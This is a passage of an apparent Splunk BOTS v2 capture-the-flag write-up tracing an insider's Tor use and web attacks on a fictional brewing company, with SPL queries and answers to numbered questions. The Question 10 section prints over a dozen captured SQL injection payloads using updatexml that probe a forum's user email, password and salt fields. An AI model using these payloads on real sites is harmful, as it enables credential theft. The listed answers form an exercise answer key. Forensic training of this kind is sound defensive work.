21sdVowQm1jbTkwYUM1c2VUNCtEUXBUZFdKcVpXTjBPaUJJWldsdWVpQkNaWEp1YUdGeVpDQkRiMjUwWVdOMElFbHUgWm05eWJXRjBhVzl1RFFvTkNraGxiR3h2SUVGdFltVnlMQTBLRFFwSGNtVmhkQ0IwWVd4cmFXNW5JSGRwZEdnZ2VXOTFJSFJ2WkdGNSBMQ0JvWlhKbElHbHpJRzE1SUdOdmJuUmhZM1FnYVc1bWIzSnRZWFJwYjI0dUlFUnZJSGx2ZFNCb1lYWmxJR0VnY0dWeWMyOXVZV3dnIFpXMWhhV3dnU1NCallXNGdjbVZoWTJnZ2VXOTFJR0YwSUdGeklIZGxiR3cvRFFvTkNsUm9ZVzVySUZsdmRRMEtEUXBJWldsdWVpQkMgWlhKdWFHRnlaQTBLYUdWeWJtaGhjbVJBWW1WeWEySmxaWEl1WTI5dFBHMWhhV3gwYnpwb1pYSnVhR0Z5WkVCaVpYSnJZbVZsY2k1aiBiMjArRFFvNE5qVXVPRGc0TGpjMU5qTU5DZzBLIFBHaDBiV3dnZUcxc2JuTTZkajBpZFhKdU9uTmphR1Z0WVhNdGJXbGpjbTl6YjJaMExXTnZiVHAyYld3aUlIaHRiRzV6T204OUluVnkgYmpwelkyaGxiV0Z6TFcxcFkzSnZjMjltZEMxamIyMDZiMlptYVdObE9tOW1abWxqWlNJZ2VHMXNibk02ZHowaWRYSnVPbk5qYUdWdCBZWE10YldsamNtOXpiMlowTFdOdmJTUHZabVpwWTJVNmQyOXlaQ0lnZUcxc2JuTTZiVDBpYUhSMGNEb3ZMM05qYUdWdFlYTXViV2xqIGNtOXpiMlowTG1OdmJTOXZabVpwWTJVdk1qQXdOQzh4TWk5dmJXMXNJaUI0Yld4dWN6MGlhSFIwY0RvdkwzZDNkeTUzTXk1dmNtY3YgVkZJdlVrVkRMV2gwYld3ME1DSStEUW84YUdWaFpENE5Danh0WlhSaElHaDBkSEF0WlhGMWFYWTlJa052Ym5SbGJuUXRWSGx3WlNJZyBZMjl1ZEdWdWREMGlkR1Y0ZEM5b2RHMXNPeUJqYUdGeWMyVjBQWFYwWmkwNElqNE5Danh0WlhSaElHNWhiV1U5SWtkbGJtVnlZWFJ2IGNpSWdZMjl1ZEdWdWREMGlUV2xqY205emIyWjBJRmR2Y21RZ01UVWdLR1pwYkhSbGNtVmtJRzFsWkdsMWJTa2lQZzBLUEhOMGVXeGwgUGp3aExTME5DaThxSUVadmJuUWdSR1ZtYVc1cGRHbHZibk1nS2k4TkNrQm1iMjUwTFdaaFkyVU5DZ2w3Wm05dWRDMW1ZVzFwYkhrNiBTR1ZzZG1WMGFXTmhPdzBLQ1hCaGJtOXpaUzB4T2pJZ01URWdOU0EwSURJZ01pQXlJRElnTWlBME8zME5Da0JtYjI1MExXWmhiV2xzZVRvaVEyRnNhV0p5YVNJcyBjMkZ1Y3kxelpYSnBaanQ5RFFwaE9teHBibXNzSUhOd1lXNHVUWE52U0hsd1pYSnNhVzVyRFFvSmUyMXpieTF6ZEhsc1pTMXdjbWx2IGNtbDBlVG81T1RzTkNnbGpiMnh2Y2pvak1EVTJNME14T3cwS0NYUmxlSFF0WkdWamIzSmhkR2x2YmpwMWJtUmxjbXhwYm1VN2ZRMEsgWVRwMmFYTnBkR1ZrTENCemNHRnVMazF6YjBoNWNHVnliR2x1YTBadmJHeHZkMlZrRFFvSmUyMXpieTF6ZEhsc1pTMXdjbWx2Y21sMCBlVG81T1RzTkNnbGpiMnh2Y2pvak9UVTBSamN5T3cwS0NYUmxlSFF0WkdWamIzSmhkR2x2YmpwMWJtUmxjbXhwYm1VN2ZRMEtjQzV0IGMyOXViM0p0WVd3d0xDQnNhUzV0YzI5dWIzSnRZV3d3TENCa2FYWXViWE52Ym05eWJXRnNNQTBLQ1h0dGMyOHRjM1I1YkdVdGJtRnQgWlRwdGMyOXViM0p0WVd3N0RRb0piWE52TFcxaGNtZHBiaTEwYjNBdFlXeDBPbUYxZEc4N0RRb0piV0Z5WjJsdUxYSnBaMmgwT2pCcCBianNOQ2dsdGMyOHRiV0Z5WjJsdUxXSnZkSFJ2YlMxaGJIUTZZWFYwYnpzTkNnbHRZWEpuYVc0dGJHVm1kRG93YVc0N0RRb0pabTl1IGRDMXphWHBsT2pFeExqQndkRHNOQ2dsbWIyNTBMV1poYldsc2VUb2lRMkZzYVdKeWFTSXNjMkZ1Y3kxelpYSnBaanQ5RFFwemNHRnUgTGtWdFlXbHNVM1I1YkdVeE9BMEtDWHR0YzI4dGMzUjViR1V0ZEhsd1pUcHdaWEp6YjI1aGJEc05DZ2xtYjI1MExXWmhiV2xzZVRvaSBRMkZzYVdKeWFTSXNjMkZ1Y3kxelpYSnBaanNOQ2dsamIyeHZjanAzYVc1a2IzZDBaWGgwTzMwTkNuTndZVzR1UlcxaGFXeFRkSGxzIFpUSXdEUW9KZTIxemJ5MXpkSGxzWlMxMGVYQmxPbkJsY25OdmJtRnNMWEpsY0d4NU93MEtDV1p2Ym5RdFptRnRhV3g1T2lKRFlXeHAgWW5KcElpeHpZVzV6TFhObGNtbG1PdzBLQ1dOdmJHOXlPbmRwYm1SdmQzUmxlSFE3ZlEwS0xrMXpiME5vY0VSbFptRjFiSFFOQ2dsNyBiWE52TFhOMGVXeGxMWFI1Y0dVNlpYaHdiM0owTFc5dWJIazdEUW9KWm05dWRDMXphWHBsT2pFd0xqQndkRHQ5RFFwQWNHRm5aU0JYIGIzSmtVMlZqZEdsdmJqRU5DZ2w3YzJsNlpUbzRMalZwYmlBeE1TNHdhVzQ3RFFvSmJXRnlaMmx1T2pFdU1HbHVJREV1TUdsdUlERXUgTUdsdUlERXVNR2x1TzMwTkNtUnBkaTVYYjNKa1UyVmpkR2x2YmpFTkNnbDdjR0ZuWlRwWGIzSmtVMlZqZEdsdmJqRTdmUTBLTFMwKyBQQzl6ZEhsc1pUNDhJUzB0VzJsbUlHZDBaU0J0YzI4Z09WMCtQSGh0YkQ0TkNqeHZPbk5vWVhCbFpHVm1ZWFZzZEhNZ2RqcGxlSFE5IEltVmthWFFpSUhOd2FXUnRZWGc5SWpFd01qWWlJQzgrRFFvOEwzaHRiRDQ4SVZ0bGJtUnBabDB0TFQ0OElTMHRXMmxtSUdkMFpTQnQgYzI4Z09WMCtQSGh0YkQ0TkNqeHZPbk5vWVhCbGJHRjViM1YwSUhZNlpYaDBQU0psWkdsMElqNE5Danh2T21sa2JXRndJSFk2WlhoMCBQU0psWkdsMElpQmtZWFJoUFNJeElpQXZQZzBLUEM5dk9uTm9ZWEJsYkdGNWIzVjBQand2ZUcxc1Bqd2hXMlZ1WkdsbVhTMHRQZzBLIFBDOW9aV0ZrUGcwS1BHSnZaSGtnYkdGdVp6MGlSVTR0VlZNaUlHeHBibXM5SWlNd05UWXpRekVpSUhac2FXNXJQU0lqT1RVMFJqY3kgSWo0TkNqeGthWFlnWTJ4aGMzTTlJbGR2Y21SVFpXTjBhVzl1TVNJK0RRbzhjQ0JqYkdGemN6MGlUWE52VG05eWJXRnNJajVVYUdGdSBhM01nWm05eUlIUmhhMmx1WnlCMGFHVWdkR2x0WlNCMGIyUmhlU3dnUVhNZ1pHbHpZM1Z6YzJWa0lHaGxjbVVnYVhNZ2RHaGxJR1J2IFkzVnRaVzUwSUVrZ2QyRnpJSEpsWm1WeWNtbHVaeUIwYnk0bWJtSnpjRHNnVUhKdlltRmliSGtnWW1WMGRHVnlJSFJ2SUhSaGEyVWcgZEdocGN5QnZabVpzYVc1bExpQkZiV0ZwYkNCdFpTQm1jbTl0SUc1dmR5QnZiaUJoZEEwS1BHRWdhSEpsWmowaWJXRnBiSFJ2T21GdCBZbVZ5YzNSb1pXSmxjM1JBZVdWaGMzUnBaV0psWVhOMGFXVXVZMjl0SWo1aGJXSmxjbk4wYUdWaVpYTjBRSGxsWVhOMGFXVmlaV0Z6IGRHbGxMbU52YlR3dllUNE5Danh2T25BK1BDOXZPbkErUEM5d1BnMEtQSEFnWTJ4aGMzTTlJazF6YjA1dmNtMWhiQ0krUEc4NmNENG0gYm1KemNEczhMMjg2Y0Q0OEwzQStEUW84WkdsMlBnMEtQR1JwZGlCemRIbHNaVDBpWW05eVpHVnlPbTV2Ym1VN1ltOXlaR1Z5TFhSdiBjRHB6YjJ4cFpDQWpSVEZGTVVVeElERXVNSEIwTzNCaFpHUnBibWM2TXk0d2NIUWdNR2x1SURCcGJpQXdhVzRpUGcwS1BIQWdZMnhoIGMzTTlJazF6YjA1dmNtMWhiQ0krUEdJK1JuSnZiVG84TDJJK0lEeGhJR2h5WldZOUltMWhhV3gwYnpwb1ltVnlibWhoY21SQVltVnkgYTJKbFpYSXVZMjl0SWo1b1ltVnlibWhoY21SQVltVnlhMkpsWlhJdVkyOXRQQzloUGlCYlBHRWdhSEpsWmowaWJXRnBiSFJ2T21oaSBaWEp1YUdGeVpFQmlaWEpyWW1WbGNpNWpiMjBpUG0xaGFXeDBienBvWW1WeWJtaGhjbVJBWW1WeWEySmxaWEl1WTI5dFBDOWhQbDBOIENqeGljajROQ2p4aVBsTmxiblE2UEM5aVBpQkdjbWxrWVhrc0lFRjFaM1Z6ZENBeE1Td2dNakF4TnlBNU9qQTRJRUZOUEdKeVBnMEsgUEdJK1ZHODZQQzlpUGlCQmJXSmxjaUJVZFhKcGJtY2dKbXgwT3p4aElHaHlaV1k5SW0xaGFXeDBienBoZEhWeWFXNW5RR1p5YjNSbyBMbXg1SWo1aGRIVnlhVzVuUUdaeWIzUm9MbXg1UEM5aFBpWm5kRHM4WW5JK0RRbzhZajVUZFdKcVpXTjBPand2WWo0Z1NHVnBibm9nIFFtVnlibWhoY21RZ1EyOXVkR0ZqZENCSmJtWnZjbTFoZEdsdmJqeHZPbkErUEM5dk9uQStQQzl3UGcwS1BDOWthWFkrRFFvOEwyUnAgZGo0TkNqeHdJR05zWVhOelBTSk5jMjlPYjNKdFlXd2lQanh2T25BK0ptNWljM0E3UEM5dk9uQStQQzl3UGcwS1BIQWdZMnhoYzNNOSBJazF6YjA1dmNtMWhiQ0krUEhOd1lXNGdjM1I1YkdVOUltWnZiblF0YzJsNlpUbzVMakJ3ZER0bWIyNTBMV1poYldsc2VUb21jWFZ2IGREdElaV3gyWlhScFkyRW1jWFZ2ZERzc2MyRnVjeTF6WlhKcFppSStTR1ZzYkc4Z1FXMWlaWElzSm01aWMzQTdQRzg2Y0Q0OEwyODYgY0Q0OEwzTndZVzQrUEM5d1BnMEtQR1JwZGo0TkNqeHdJR05zWVhOelBTSk5jMjlPYjNKdFlXd2lQanh6Y0dGdUlITjBlV3hsUFNKbSBiMjUwTFhOcGVtVTZPUzR3Y0hRN1ptOXVkQzFtWVcxcGJIazZKbkYxYjNRN1NHVnNkbVYwYVdOaEpuRjFiM1E3TEhOaGJuTXRjMlZ5IGFXWWlQanh2T25BK0ptNWljM0E3UEM5dk9uQStQQzl6Y0dGdVBqd3ZjRDROQ2p3dlpHbDJQZzBLUEdScGRqNE5Danh3SUdOc1lYTnogUFNKTmMyOU9iM0p0WVd3aVBqeHpjR0Z1SUhOMGVXeGxQU0ptYjI1MExYTnBlbVU2T1M0d2NIUTdabTl1ZEMxbVlXMXBiSGs2Sm5GMSBiM1E3U0dWc2RtVjBhV05oSm5GMWIzUTdMSE5oYm5NdGMyVnlhV1lpUGtkeVpXRjBJSFJoYkd0cGJtY2dkMmwwYUNCNWIzVWdkRzlrIFlYa3NJR2hsY21VZ2FYTWdiWGtnWTI5dWRHRmpkQ0JwYm1admNtMWhkR2x2Ymk0Z1JHOGdlVzkxSUdoaGRtVWdZU0J3WlhKemIyNWggYkNCbGJXRnBiQ0JKSUdOaGJpQnlaV0ZqYUNCNWIzVWdZWFFnWVhNZ2QyVnNiRDhtYm1KemNEczhienB3UGp3dmJ6cHdQand2YzNCaCBiajQ4TDNBK0RRbzhMMlJwZGo0TkNqeGthWFkrRFFvOGNDQmpiR0Z6Y3owaVRYTnZUbTl5YldGc0lqNDhjM0JoYmlCemRIbHNaVDBpIFptOXVkQzF6YVhwbE9qa3VNSEIwTzJadmJuUXRabUZ0YVd4NU9pWnhkVzkwTzBobGJIWmxkR2xqWVNaeGRXOTBPeXh6WVc1ekxYTmwgY21sbUlqNDhienB3UGladVluTndPend2Ynpwd1Bqd3ZjM0JoYmo0OEwzQStEUW84TDJScGRqNE5DanhrYVhZK0RRbzhjQ0JqYkdGeiBjejBpVFhOdlRtOXliV0ZzSWo0OGMzQmhiaUJ6ZEhsc1pUMGlabTl1ZEMxemFYcGxPamt1TUhCME8yWnZiblF0Wm1GdGFXeDVPaVp4IGRXOTBPMGhsYkhabGRHbGpZU1p4ZFc5ME95eHpZVzV6TFhObGNtbG1JajVVYUdGdWF5QlpiM1U4Ynpwd1Bqd3ZienB3UGp3dmMzQmggYmo0OEwzQStEUW84TDJScGRqNE5DanhrYVhZK0RRbzhjQ0JqYkdGemN6MGlUWE52VG05eWJXRnNJajQ4YzNCaGJpQnpkSGxzWlQwaSBabTl1ZEMxemFYcGxPamt1TUhCME8yWnZiblF0Wm1GdGFXeDVPaVp4ZFc5ME8waGxiSFpsZEdsallTWnhkVzkwT3l4ellXNXpMWE5sIGNtbG1JajQ4Ynpwd1BpWnVZbk53T3p3dmJ6cHdQand2YzNCaGJqNDhMM0ErRFFvOEwyUnBkajROQ2p4a2FYWStEUW84Y0NCamJHRnogY3owaVRYTnZUbTl5YldGc0lqNDhjM0JoYmlCemRIbHNaVDBpWm05dWRDMXphWHBsT2prdU1IQjBPMlp2Ym5RdFptRnRhV3g1T2laeCBkVzkwTzBobGJIWmxkR2xqWVNaeGRXOTBPeXh6WVc1ekxYTmxjbWxtSWo1SVpXbHVlaUJDWlhKdWFHRnlaRHh2T25BK1BDOXZPbkErIFBDOXpjR0Z1UGp3dmNENE5Dand2WkdsMlBnMEtQR1JwZGo0TkNqeHdJR05zWVhOelBTSk5jMjlPYjNKdFlXd2lQanh6Y0dGdUlITjAgZVd4bFBTSm1iMjUwTFhOcGVtVTZPUzR3Y0hRN1ptOXVkQzFtWVcxcGJIazZKbkYxYjNRN1NHVnNkbVYwYVdOaEpuRjFiM1E3TEhOaCBibk10YzJWeWFXWWlQanhoSUdoeVpXWTlJbTFoYVd4MGJ6cG9aWEp1YUdGeVpFQmlaWEpyWW1WbGNpNWpiMjBpUG1obGNtNW9ZWEprIFFHSmxjbXRpWldWeUxtTnZiVHd2WVQ0OGJ6cHdQand2Ynpwd1Bqd3ZjM0JoYmo0OEwzQStEUW84TDJScGRqNE5DanhrYVhZK0RRbzggY0NCamJHRnpjejBpVFhOdlRtOXliV0ZzSWo0OGMzQmhiaUJ6ZEhsc1pUMGlabTl1ZEMxemFYcGxPamt1TUhCME8yWnZiblF0Wm1GdCBhV3g1T2laeGRXOTBPMGhsYkhabGRHbGpZU1p4ZFc5ME95eHpZVzV6TFhObGNtbG1JajQ0TmpVdU9EZzRMamMxTmpNbWJtSnpjRHM4IGJ6cHdQand2Ynpwd1Bqd3ZjM0JoYmo0OEwzQStEUW84TDJScGRqNE5DanhrYVhZK0RRbzhjQ0JqYkdGemN6MGlUWE52VG05eWJXRnMgSWo0OGMzQmhiaUJ6ZEhsc1pUMGlabTl1ZEMxemFYcGxPamt1TUhCME8yWnZiblF0Wm1GdGFXeDVPaVp4ZFc5ME8waGxiSFpsZEdsaiBZU1p4ZFc5ME95eHpZVzV6TFhObGNtbG1JajQ4Ynpwd1BpWnVZbk53T3p3dmJ6cHdQand2YzNCaGJqNDhMM0ErRFFvOEwyUnBkajROIENqd3ZaR2wyUGcwS1BDOWliMlI1UGcwS1BDOW9kRzFzUGcwSyAtLV8wMDRfU04xUFIxOE1CMDU4OTc5MjA1ODc1RTg4QjA2MDYxNDgwRDQ5NjBTTjFQUjE4TUIwNTg5bmFtcF8&oeol=CRLF) for Base64 decoded, we got plain-text content:

```text
©©Thanks for taking the time today, As discussed here is the document I was referring to.  Probably better to take this offline. Email me from now on at ambersthebest@yeastiebeastie.com<mailto:ambersthebest@yeastiebeastie.com>

From: hbernhard@berkbeer.com<mailto:hbernhard@berkbeer.com> [mailto:hbernhard@berkbeer.com]
Sent: Friday, August 11, 2017 9:08 AM
To: Amber Turing <aturing@froth.ly<mailto:aturing@froth.ly>>
Subject: Heinz Bernhard Contact Information

Hello Amber,

Great talking with you today, here is my contact information. Do you have a personal email I can reach you at as well?

Thank You

Heinz Bernhard
hernhard@berkbeer.com<mailto:hernhard@berkbeer.com>
865.888.7563
```

> ANSWER: ambersthebest@yeastiebeastie.com
{: .prompt-info }

#### Question 6 (105): What version of TOR did Amber install to obfuscate her web browsing? Answer guidance: Numeric with one or more delimiter.

If y'all followed me in [BOTSV1](https://phamthanhsang-cs.site/posts/BOTSV1/), we could know how to find the right way to resolve the question easily:
- First: `xmlwineventlog` sourcetype - it captures detailed Windows Event Logs (Sysmon), allowing us to trace Amber's actions precisely.
- Second: Amber's Download Folder. 
- Last but not least: We had "Tor" as the keyword. 

But before jump into SPL search, for those who don't know what [Tor](https://www.torproject.org/about/history/) is: Tor allows anonymous use of internet veiling the actual identity of the user. It protects the user from any traffic analysis and network spying. Tor is perhaps the most popular and secure option available for anonymous internet connectivity.

![pic8](/assets/images/botsv2/pic8.png)

However, the final exit node remains vulnerable to exposure. This vulnerability makes Tor a double-edged sword, protecting user privacy while potentially facilitating suspicious activities. Amber leveraged Tor in an attempt to hide her tracks while engaging in suspicious behavior - Extract Frothly's trade secret to the competitor.


Let's back to our Splunk and investigate what version of Tor did Amber install.

```sql
index=botsv2 sourcetype=xmlwineventlog Tor OR tor "C:\\Users\\*\\Downloads" AND amber OR aturing 
|reverse

125 events back, good number to start looking around !
```
Right after look into the first event, we already know what version of Tor did Amber use for her nasty activities
```xml
<Event
	xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>
	<System>
		<Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/>
		<EventID>2</EventID>
		<Version>4</Version>
		<Level>4</Level>
		<Task>2</Task>
		<Opcode>0</Opcode>
		<Keywords>0x8000000000000000</Keywords>
		<TimeCreated SystemTime='2017-08-24T04:20:28.483725400Z'/>
		<EventRecordID>118435</EventRecordID>
		<Correlation/>
		<Execution ProcessID='900' ThreadID='1824'/>
		<Channel>Microsoft-Windows-Sysmon/Operational</Channel>
		<Computer>wrk-aturing.frothly.local</Computer>
		<Security UserID='S-1-5-18'/>
	</System>
	<EventData>
		<Data Name='UtcTime'>2017-08-24 04:20:28.483</Data>
		<Data Name='ProcessGuid'>{B2E0DF5E-9CDF-598C-0000-00101AF3CB01}</Data>
		<Data Name='ProcessId'>4536</Data>
		<Data Name='Image'>C:\Users\amber.turing\Downloads\torbrowser-install-7.0.4_en-US.exe</Data>
		<Data Name='TargetFilename'>C:\Users\amber.turing\Desktop\Tor Browser\Browser\Accessible.tlb</Data>
		<Data Name='CreationUtcTime'>2000-01-14 10:30:00.000</Data>
		<Data Name='PreviousCreationUtcTime'>2017-08-24 04:20:28.483</Data>
	</EventData>
</Event>
```

`<Data Name='Image'>C:\Users\amber.turing\Downloads\torbrowser-install-7.0.4_en-US.exe</Data>`

> ANSWER: 7.0.4
{: .prompt-info }

### Series 200

#### Question 7 (200): What is the public IPv4 address of the server running www.brewertalk.com?
In this task from BOTSV2, we aim to identify the IPv4 address for `www.brewertalk.com`. This reminds me of a similar challenge from BOTSV1, where we used the `stream:dns` sourcetype and `query_type{}=A` filter to extract IPv4 information for domains. Applying the same logic here, let’s dive into Splunk.

```sql
index=botsv2 sourcetype=stream:dns www.brewertalk.com "query_type{}"=A

//This query looks for DNS traffic (`stream:dns`) related to `www.brewertalk.com` and filters for `query_type{}=A`, which indicates requests for IPv4 addresses.
```
Twerking a bit our SPL search, we also see what source IP address query `www.brewertalk.com` is - 172.31.0.2

![pic9](/assets/images/botsv2/pic9.png)

> ANSWER: 52.42.208.228
{: .prompt-info } 

#### Question 8 (201): Provide the IP address of the system used to run a web vulnerability scan against www.brewertalk.com.



> ANSWER: 45.77.65.211
{: .prompt-info } 

#### Question 9 (202): The IP address from question 201 is also being used by a likely different piece of software to attack a URI path. What is the URI path? Answer guidance: Include the leading forward slash in your answer. Do not include the query string or other parts of the URI. Answer example: /phpinfo.php

> ANSWER: /member.php
{: .prompt-info } 

#### Question 10 (203): What SQL function is being abused on the uri path from question 202?

```sql
index=botsv2 sourcetype=stream:http "/member.php" 45.77.65.211 AND "'" OR ";" `spog`
```

```sql
`form_data` field example:
regcheck1=&regcheck2=true&username=makman&password=mukarram&password2=mukarram&email=mak@live.com&email2=mak@live.com&referrername=&imagestring=F7yR4&imagehash=1c1d0e6eae9c113f4ff65339e4b3079c&answer=4&allownotices=1&receivepms=1&pmnotice=1&subscriptionmethod=0&timezoneoffset=0&dstcorrection=2&regtime=1416039333&step=registration&action=do_register&regsubmit=Submit Registration!&question_id=makman' and updatexml(NULL,concat (0x3a,(LENGTH((SELECT email FROM mybb_users ORDER BY UID LIMIT 0,1)))),NULL) and '1
regcheck1=&regcheck2=true&username=makman&password=mukarram&password2=mukarram&email=mak@live.com&email2=mak@live.com&referrername=&imagestring=F7yR4&imagehash=1c1d0e6eae9c113f4ff65339e4b3079c&answer=4&allownotices=1&receivepms=1&pmnotice=1&subscriptionmethod=0&timezoneoffset=0&dstcorrection=2&regtime=1416039333&step=registration&action=do_register&regsubmit=Submit Registration!&question_id=makman' and updatexml(NULL,concat (0x3a,(LENGTH((SELECT email FROM mybb_users ORDER BY UID LIMIT 1,1)))),NULL) and '1
regcheck1=&regcheck2=true&username=makman&password=mukarram&password2=mukarram&email=mak@live.com&email2=mak@live.com&referrername=&imagestring=F7yR4&imagehash=1c1d0e6eae9c113f4ff65339e4b3079c&answer=4&allownotices=1&receivepms=1&pmnotice=1&subscriptionmethod=0&timezoneoffset=0&dstcorrection=2&regtime=1416039333&step=registration&action=do_register&regsubmit=Submit Registration!&question_id=makman' and updatexml(NULL,concat (0x3a,(LENGTH((SELECT email FROM mybb_users ORDER BY UID LIMIT 2,1)))),NULL) and '1
regcheck1=&regcheck2=true&username=makman&password=mukarram&password2=mukarram&email=mak@live.com&email2=mak@live.com&referrername=&imagestring=F7yR4&imagehash=1c1d0e6eae9c113f4ff65339e4b3079c&answer=4&allownotices=1&receivepms=1&pmnotice=1&subscriptionmethod=0&timezoneoffset=0&dstcorrection=2&regtime=1416039333&step=registration&action=do_register&regsubmit=Submit Registration!&question_id=makman' and updatexml(NULL,concat (0x3a,(LENGTH((SELECT email FROM mybb_users ORDER BY UID LIMIT 3,1)))),NULL) and '1
regcheck1=&regcheck2=true&username=makman&password=mukarram&password2=mukarram&email=mak@live.com&email2=mak@live.com&referrername=&imagestring=F7yR4&imagehash=1c1d0e6eae9c113f4ff65339e4b3079c&answer=4&allownotices=1&receivepms=1&pmnotice=1&subscriptionmethod=0&timezoneoffset=0&dstcorrection=2&regtime=1416039333&step=registration&action=do_register&regsubmit=Submit Registration!&question_id=makman' and updatexml(NULL,concat (0x3a,(LENGTH((SELECT email FROM mybb_users ORDER BY UID LIMIT 4,1)))),NULL) and '1
regcheck1=&regcheck2=true&username=makman&password=mukarram&password2=mukarram&email=mak@live.com&email2=mak@live.com&referrername=&imagestring=F7yR4&imagehash=1c1d0e6eae9c113f4ff65339e4b3079c&answer=4&allownotices=1&receivepms=1&pmnotice=1&subscriptionmethod=0&timezoneoffset=0&dstcorrection=2&regtime=1416039333&step=registration&action=do_register&regsubmit=Submit Registration!&question_id=makman' and updatexml(NULL,concat (0x3a,(LENGTH((SELECT password FROM mybb_users ORDER BY UID LIMIT 0,1)))),NULL) and '1
regcheck1=&regcheck2=true&username=makman&password=mukarram&password2=mukarram&email=mak@live.com&email2=mak@live.com&referrername=&imagestring=F7yR4&imagehash=1c1d0e6eae9c113f4ff65339e4b3079c&answer=4&allownotices=1&receivepms=1&pmnotice=1&subscriptionmethod=0&timezoneoffset=0&dstcorrection=2&regtime=1416039333&step=registration&action=do_register&regsubmit=Submit Registration!&question_id=makman' and updatexml(NULL,concat (0x3a,(LENGTH((SELECT password FROM mybb_users ORDER BY UID LIMIT 1,1)))),NULL) and '1
regcheck1=&regcheck2=true&username=makman&password=mukarram&password2=mukarram&email=mak@live.com&email2=mak@live.com&referrername=&imagestring=F7yR4&imagehash=1c1d0e6eae9c113f4ff65339e4b3079c&answer=4&allownotices=1&receivepms=1&pmnotice=1&subscriptionmethod=0&timezoneoffset=0&dstcorrection=2&regtime=1416039333&step=registration&action=do_register&regsubmit=Submit Registration!&question_id=makman' and updatexml(NULL,concat (0x3a,(LENGTH((SELECT password FROM mybb_users ORDER BY UID LIMIT 2,1)))),NULL) and '1
regcheck1=&regcheck2=true&username=makman&password=mukarram&password2=mukarram&email=mak@live.com&email2=mak@live.com&referrername=&imagestring=F7yR4&imagehash=1c1d0e6eae9c113f4ff65339e4b3079c&answer=4&allownotices=1&receivepms=1&pmnotice=1&subscriptionmethod=0&timezoneoffset=0&dstcorrection=2&regtime=1416039333&step=registration&action=do_register&regsubmit=Submit Registration!&question_id=makman' and updatexml(NULL,concat (0x3a,(LENGTH((SELECT password FROM mybb_users ORDER BY UID LIMIT 3,1)))),NULL) and '1
regcheck1=&regcheck2=true&username=makman&password=mukarram&password2=mukarram&email=mak@live.com&email2=mak@live.com&referrername=&imagestring=F7yR4&imagehash=1c1d0e6eae9c113f4ff65339e4b3079c&answer=4&allownotices=1&receivepms=1&pmnotice=1&subscriptionmethod=0&timezoneoffset=0&dstcorrection=2&regtime=1416039333&step=registration&action=do_register&regsubmit=Submit Registration!&question_id=makman' and updatexml(NULL,concat (0x3a,(LENGTH((SELECT password FROM mybb_users ORDER BY UID LIMIT 4,1)))),NULL) and '1
regcheck1=&regcheck2=true&username=makman&password=mukarram&password2=mukarram&email=mak@live.com&email2=mak@live.com&referrername=&imagestring=F7yR4&imagehash=1c1d0e6eae9c113f4ff65339e4b3079c&answer=4&allownotices=1&receivepms=1&pmnotice=1&subscriptionmethod=0&timezoneoffset=0&dstcorrection=2&regtime=1416039333&step=registration&action=do_register&regsubmit=Submit Registration!&question_id=makman' and updatexml(NULL,concat (0x3a,(LENGTH((SELECT salt FROM mybb_users ORDER BY UID LIMIT 0,1)))),NULL) and '1
regcheck1=&regcheck2=true&username=makman&password=mukarram&password2=mukarram&email=mak@live.com&email2=mak@live.com&referrername=&imagestring=F7yR4&imagehash=1c1d0e6eae9c113f4ff65339e4b3079c&answer=4&allownotices=1&receivepms=1&pmnotice=1&subscriptionmethod=0&timezoneoffset=0&dstcorrection=2&regtime=1416039333&step=registration&action=do_register&regsubmit=Submit Registration!&question_id=makman' and updatexml(NULL,concat (0x3a,(LENGTH((SELECT salt FROM mybb_users ORDER BY UID LIMIT 1,1)))),NULL) and '1
regcheck1=&regcheck2=true&username=makman&password=mukarram&password2=mukarram&email=mak@live.com&email2=mak@live.com&referrername=&imagestring=F7yR4&imagehash=1c1d0e6eae9c113f4ff65339e4b3079c&answer=4&allownotices=1&receivepms=1&pmnotice=1&subscriptionmethod=0&timezoneoffset=0&dstcorrection=2&regtime=1416039333&step=registration&action=do_register&regsubmit=Submit Registration!&question_id=makman' and updatexml(NULL,concat (0x3a,(LENGTH((SELECT salt FROM mybb_users ORDER BY UID LIMIT 2,1)))),NULL) and '1
regcheck1=&regcheck2=true&username=makman&password=mukarram&password2=mukarram&email=mak@live.com&email2=mak@live.com&referrername=&imagestring=F7yR4&imagehash=1c1d0e6eae9c113f4ff65339e4b3079c&answer=4&allownotices=1&receivepms=1&pmnotice=1&subscriptionmethod=0&timezoneoffset=0&dstcorrection=2&regtime=1416039333&step=registration&action=do_register&regsubmit=Submit Registration!&question_id=makman' and updatexml(NULL,concat (0x3a,(LENGTH((SELECT salt FROM mybb_users ORDER BY UID LIMIT 3,1)))),NULL) and '1
regcheck1=&regcheck2=true&username=makman&password=mukarram&password2=mukarram&email=mak@live.com&email2=mak@live.com&referrername=&imagestring=F7yR4&imagehash=1c1d0e6eae9c113f4ff65339e4b3079c&answer=4&allownotices=1&receivepms=1&pmnotice=1&subscriptionmethod=0&timezoneoffset=0&dstcorrection=2&regtime=1416039333&step=registration&action=do_register&regsubmit=Submit Registration!&question_id=makman' and updatexml(NULL,concat (0x3a,(LENGTH((SELECT salt FROM mybb_users ORDER BY UID LIMIT 4,1)))),NULL) and '1
regcheck1=&regcheck2=true&username=makman&password=mukarram&password2=mukarram&email=mak@live.com&email2=mak@live.com&referrername=&imagestring=F7yR4&imagehash=1c1d0e6eae9c113f4ff65339e4b3079c&answer=4&allownotices=1&receivepms=1&pmnotice=1&subscriptionmethod=0&timezoneoffset=0&dstcorrection=2&regtime=1416039333&step=registration&action=do_register&regsubmit=Submit Registration!&question_id=makman' and updatexml(NULL,concat (0x3a,(LENGTH((SELECT salt FROM mybb_users ORDER BY UID LIMIT 5,1)))),NULL) and '1
regcheck1=&regcheck2=true&username=makman&password=mukarram&password2=mukarram&email=mak@live.com&email2=mak@live.com&referrername=&imagestring=F7yR4&imagehash=1c1d0e6eae9c113f4ff65339e4b3079c&answer=4&allownotices=1&receivepms=1&pmnotice=1&subscriptionmethod=0&timezoneoffset=0&dstcorrection=2&regtime=1416039333&step=registration&action=do_register&regsubmit=Submit Registration!&question_id=makman' and updatexml(NULL,concat (0x3a,(LENGTH((SELECT uid FROM mybb_users ORDER BY UID LIMIT 0,1)))),NULL) and '1
